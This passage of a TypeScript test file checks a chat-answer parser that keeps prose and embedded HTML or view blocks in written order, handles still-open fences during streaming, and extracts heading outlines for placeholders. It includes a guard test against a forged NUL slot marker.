    writeFileSync(join(root, 'overrides/chat-html-kit.css'), 'a'.repeat(200 * 1024));
    const out = await call(root);
    expect(out.body?.css).toBeNull();
    expect(String(out.body?.notice)).toMatch(/limit/i);
  });

  it('names the path it looked at, so a user can find the file to create', async () => {
    expect((await call(root)).body?.path).toBe('overrides/chat-html-kit.css');
  });
});

// -----------------------------------------------------------------------------------------
// WRITTEN ORDER -- `segments`
//
// The defect these lock down is not cosmetic. Before 2026-08-27 the parser returned prose as
// ONE merged string and blocks as a separate list, so an answer written "here is the shape /
// [card] / here is what to notice" rendered BOTH sentences and then the card: the words that
// frame a drawing landed above it, every time, and the card read as an attachment rather than
// as part of the answer. `segments` is the fix, and the tests below are mostly about the two
// ways it could quietly come undone -- a lost position, and a leaked slot marker.
// -----------------------------------------------------------------------------------------

/** The character that delimits a slot marker inside the parser. Built rather than typed: a
 *  literal NUL in a source file is invisible to every reviewer who would need to see it. */
const NUL = String.fromCharCode(0);

const kinds = (text: string) => parseChatActions(text).segments.map((s) => s.kind);
const proseOf = (text: string) => parseChatActions(text).segments
  .flatMap((s) => (s.kind === 'prose' ? [s.text] : []));

describe('parseChatActions -- segments keep written order', () => {
  it('puts the prose written AFTER a block after it, not above it', () => {
    const r = parseChatActions(`Here is the shape.\n\n${fence('<p>x</p>')}\n\nWhat do you think?`);
    expect(r.segments).toEqual([
      { kind: 'prose', text: 'Here is the shape.' },
      { kind: 'html', html: '<p>x</p>' },
      { kind: 'prose', text: 'What do you think?' },
    ]);
  });

  it('interleaves several blocks of both kinds with the prose between them', () => {
    const view = '```dream-view\n{"type":"insight","id":"weekly-active-users"}\n```';
    const text = `One.\n\n${fence('<p>a</p>')}\n\nTwo.\n\n${view}\n\nThree.`;
    expect(kinds(text)).toEqual(['prose', 'html', 'prose', 'view', 'prose']);
  });

  it('is one segment when the answer is nothing but a block', () => {
    expect(parseChatActions(fence('<p>x</p>')).segments).toEqual([{ kind: 'html', html: '<p>x</p>' }]);
  });

  it('leaves `body` byte-identical to the pre-segment behaviour', () => {
    const r = parseChatActions(`Here is the shape.\n\n${fence('<p>x</p>')}\n\nWhat do you think?`);
    expect(r.body).toBe('Here is the shape.\n\nWhat do you think?');
  });

  it('never leaks a slot marker into the prose -- neither into `body` nor into a segment', () => {
    const text = `A.\n\n${fence('<p>x</p>')}\n\nB.`;
    expect(parseChatActions(text).body).not.toContain(NUL);
    expect(proseOf(text)).toEqual(['A.', 'B.']);
  });

  it('cannot be tricked into a phantom block by a NUL the answer wrote itself', () => {
    // NUL is scrubbed on entry precisely so the marker channel cannot be forged. Were it
    // not, this would resolve to blocks[0] and draw a second copy of a card the answer
    // only drew once.
    const r = parseChatActions(`A.${NUL}dcblock0${NUL}B.\n\n${fence('<p>x</p>')}`);
    expect(r.segments).toEqual([
      { kind: 'prose', text: 'A.dcblock0B.' },
      { kind: 'html', html: '<p>x</p>' },
    ]);
  });

  it('gives a DROPPED block no position -- an oversized body leaves prose only', () => {
    const r = parseChatActions(`Real answer.\n\n${fence('<p>' + 'a'.repeat(MAX_HTML_BYTES) + '</p>')}`);
    expect(r.segments).toEqual([{ kind: 'prose', text: 'Real answer.' }]);
    expect(r.notices).toHaveLength(1);
  });

  it('drops the blocks past the per-message cap without shifting the ones that stayed', () => {
    const text = Array.from(
      { length: MAX_HTMLS_PER_MESSAGE + 2 },
      (_v, i) => `p${i}\n\n${fence(`<p>${i}</p>`)}`,
    ).join('\n\n');
    const html = parseChatActions(text).segments
      .flatMap((s) => (s.kind === 'html' ? [s.html] : []));
    expect(html).toEqual(Array.from({ length: MAX_HTMLS_PER_MESSAGE }, (_v, i) => `<p>${i}</p>`));
  });

  it('produces no empty prose segment where an action fence or a board reference was', () => {
    const text = 'Look:\n\n![board](docs/a.excalidraw.md)\n\n```dream-actions\n[]\n```\n\n'
      + fence('<p>x</p>');
    expect(kinds(text)).toEqual(['prose', 'html']);
  });
});

describe('parseChatActions -- a still-open fence holds its own slot', () => {
  it('lands a `pending` segment AFTER the prose already written, carrying the markup so far', () => {
    const r = parseChatActions('Building it now.\n\n```dream-html\n<div class="dc-doc"><h2 class="dc-h2">Half a');
    expect(r.segments).toEqual([
      { kind: 'prose', text: 'Building it now.' },
      { kind: 'pending', fence: 'html', partial: '\n<div class="dc-doc"><h2 class="dc-h2">Half a' },
    ]);
    expect(r.pendingView).toBe(true);
  });

  it('carries no partial for a `dream-view` -- its payload is JSON, illegible mid-stream', () => {
    const r = parseChatActions('One sec.\n\n```dream-view\n{"type":"insi');
    expect(r.segments.at(-1)).toEqual({ kind: 'pending', fence: 'view', partial: '' });
  });

  it('gives a still-open `dream-actions` fence no segment at all -- it never had a placeholder', () => {
    const r = parseChatActions('Done.\n\n```dream-actions');
    expect(r.segments).toEqual([{ kind: 'prose', text: 'Done.' }]);
    expect(r.pendingView).toBe(false);
  });

  it('replaces the pending segment with the block in the SAME position once the fence closes', () => {
    expect(kinds('A.\n\n```dream-html\n<p>x')).toEqual(['prose', 'pending']);
    expect(kinds('A.\n\n```dream-html\n<p>x</p>\n```')).toEqual(['prose', 'html']);
    expect(kinds('A.\n\n```dream-html\n<p>x</p>\n```\n\nB.')).toEqual(['prose', 'html', 'prose']);
  });
});

describe('parseChatActions -- the link-reference bail-out', () => {
  // Inherited from lib/markdownBlocks.ts, for the same reason one level up: a definition is
  // document state the lexer resolves against the WHOLE text. Split the prose and a
  // definition on one side of a block no longer reaches a use on the other.
  const withDef = `See [the docs][d].\n\n${fence('<p>x</p>')}\n\n[d]: https://example.com`;

  it('falls back to prose-then-blocks rather than splitting a document it cannot split', () => {
    expect(kinds(withDef)).toEqual(['prose', 'html']);
  });

  it('keeps the definition and its use in the SAME prose segment, which is the point', () => {
    expect(proseOf(withDef)[0]).toContain('[the docs][d]');
    expect(proseOf(withDef)[0]).toContain('[d]: https://example.com');
  });

  it('still appends a pending segment last when a fence is open', () => {
    expect(kinds('[d]: https://example.com\n\nDrawing.\n\n```dream-html\n<p>'))
      .toEqual(['prose', 'pending']);
  });
});

// -----------------------------------------------------------------------------------------
// The placeholder's outline -- `htmlOutline`
// -----------------------------------------------------------------------------------------

describe('htmlOutline', () => {
  it('finds titles NESTED inside the kit wrapper -- the whole reason it scans opening tags', () => {
    // A regex that also demanded the matching close tag would consume
    // `<div class="dc-doc">...</div>` whole on its first match and report zero titles for
    // every well-formed block.
    const partial = '<div class="dc-doc"><h2 class="dc-h2">Two ways to ship this</h2>'
      + '<div class="dc-card"><span class="dc-card-title">Behind a flag</span></div>';
    expect(htmlOutline(partial)).toEqual(['Two ways to ship this', 'Behind a flag']);
  });

  it('shows nothing for a title still being written -- half a heading is noise, not progress', () => {
    expect(htmlOutline('<div class="dc-doc"><h2 class="dc-h2">Two ways to shi')).toEqual([]);
  });

  it('grows as the markup does, and only ever gains rows', () => {
    const head = '<div class="dc-doc"><h2 class="dc-h2">Plan</h2>';
    expect(htmlOutline(head)).toEqual(['Plan']);
    expect(htmlOutline(`${head}<h3 class="dc-h3">Step one</h3>`)).toEqual(['Plan', 'Step one']);
  });

  it('ignores classes that are not titles', () => {
    expect(htmlOutline('<p class="dc-p">A whole paragraph of body copy.</p>')).toEqual([]);
    expect(htmlOutline('<span class="dc-chip dc-chip--accent">recommended</span>')).toEqual([]);
  });

  it('strips inner markup, decodes entities and collapses whitespace', () => {
    expect(htmlOutline('<h2 class="dc-h2">A\n  <strong>bold</strong>&nbsp;&amp; brave</h2>'))
      .toEqual(['A bold & brave']);
  });

  it('caps the number of lines and the length of one', () => {
    const many = Array.from({ length: 12 }, (_v, i) => `<h3 class="dc-h3">T${i}</h3>`).join('');
    expect(htmlOutline(many)).toHaveLength(6);
    const long = htmlOutline(`<h2 class="dc-h2">${'x'.repeat(200)}</h2>`)[0];
    expect(long).toHaveLength(80);
    expect(long.endsWith('…')).toBe(true);
  });

  it('is empty for empty input and never throws on junk', () => {
    expect(htmlOutline('')).toEqual([]);
    expect(htmlOutline('<<<>>> class="dc-h2" unclosed')).toEqual([]);
  });
});

describe('HTML_PENDING_HEIGHT', () => {
  it('sits above the measured floor, so a block only ever GROWS out of its placeholder', () => {
    // If this ever dropped to MIN_HTML_HEIGHT the old jump returns: the placeholder collapses
    // to a 40px sliver the moment the card mounts, then snaps open to its real height.
    expect(HTML_PENDING_HEIGHT).toBeGreaterThan(MIN_HTML_HEIGHT);
    expect(HTML_PENDING_HEIGHT).toBeLessThan(MAX_HTML_HEIGHT);
  });
});
